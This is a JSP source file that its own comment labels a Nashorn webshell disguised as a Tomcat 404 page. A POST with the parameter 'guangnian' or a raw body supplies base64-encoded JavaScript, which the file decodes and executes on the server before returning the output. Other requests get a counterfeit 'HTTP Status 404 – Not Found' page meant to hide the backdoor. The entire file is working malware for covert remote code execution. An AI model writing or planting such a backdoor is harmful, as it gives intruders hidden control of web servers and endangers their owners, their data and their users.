<%@ page language="java" contentType="text/html;charset=UTF-8" %>
<%@ page import="java.util.*,java.io.*,javax.script.*" %>
<%
/**
 * Nashorn JSP file-based webshell — disguised as Tomcat 404.
 * Protocol: POST guangnian=<base64-JS-code>
 * GET / non-POST returns a legit-looking Tomcat 404 page.
 */
final String PASSWORD = "guangnian";

if (request.getMethod().equalsIgnoreCase("POST")) {
    String input = request.getParameter(PASSWORD);
    String body = null;
    if (input == null) {
        InputStream is = request.getInputStream();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int len;
        while ((len = is.read(buf)) != -1) baos.write(buf, 0, len);
        body = new String(baos.toByteArray(), "UTF-8").trim();
        for (String p : body.split("&")) {
            if (p.startsWith(PASSWORD + "=")) {
                String raw = p.substring(PASSWORD.length() + 1);
                try { raw = java.net.URLDecoder.decode(raw, "UTF-8"); } catch (Exception e) {}
                input = raw;
                break;
            }
        }
    }
    // Raw body fallback (no guangnian= prefix): treat entire body as base64
    if (input == null && body != null && !body.isEmpty()) {
        input = body;
    }

    String code = null;
    if (input != null && !input.isEmpty()) {
        try {
            code = new String(Base64.getDecoder().decode(input), "UTF-8");
        } catch (Exception e) {
            code = input;
        }
    }

    if (code == null || code.isEmpty()) {
        response.setContentType("text/plain;charset=UTF-8");
        out.clear();
        out.print(PASSWORD);
        return;
    }

    ScriptEngine engine = new ScriptEngineManager().getEngineByName("nashorn");
    if (engine == null) {
        response.setContentType("text/plain;charset=UTF-8");
        out.clear();
        out.print(PASSWORD + "\n[!] Nashorn not available (JDK 8-14 required)");
        return;
    }

    StringWriter sw = new StringWriter();
    engine.getContext().setWriter(sw);
    engine.getContext().setErrorWriter(sw);

    try {
        engine.eval(code);
    } catch (ScriptException e) {
        sw.write(input != null ? input : PASSWORD + "\n");
    }

    String output = sw.toString();
    if (!output.contains(PASSWORD)) {
        output = PASSWORD + "\n" + output;
    }
    response.setContentType("text/plain;charset=UTF-8");
    out.clear();
    out.print(output);
} else {
    response.setStatus(404);
%>
<!doctype html><html lang="en"><head><title>HTTP Status 404 – Not Found</title><style type="text/css">H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}.line {height: 1px; background-color: #525D76; border: none;}</style></head><body><h1>HTTP Status 404 – Not Found</h1><hr class="line" /><p><b>Type</b> Status Report</p><p><b>Message</b> The requested resource is not available.</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class="line" /><h3>Apache Tomcat</h3></body></html>
<%
}
%>
